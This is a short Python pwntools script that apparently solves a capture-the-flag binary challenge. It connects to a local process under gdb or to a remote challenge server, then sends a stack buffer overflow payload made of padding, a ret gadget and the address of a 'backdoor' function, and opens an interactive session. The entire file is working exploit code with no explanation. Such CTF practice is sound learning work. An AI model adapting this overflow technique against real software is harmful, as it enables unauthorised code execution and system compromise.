from pwn import *

context.binary = exe = ELF('./11')
ret = 0x0000000000400561


def conn():
    if args.LOCAL:
        r = process(exe.path)
        gdb.attach(r, gdbscript='''
                   b*main+202
                   c
                   ''')

    else:
        r = remote('node4.buuoj.cn', 27644)
    return r


def main():
    r = conn()
    r.sendlineafter(b'your name:\n', b'50')

    payload = b'a' * 24 + p64(ret) + p64(exe.sym['backdoor'])
    r.sendlineafter(b'u name?\n', payload)

    r.interactive()


if __name__ == "__main__":
    main()
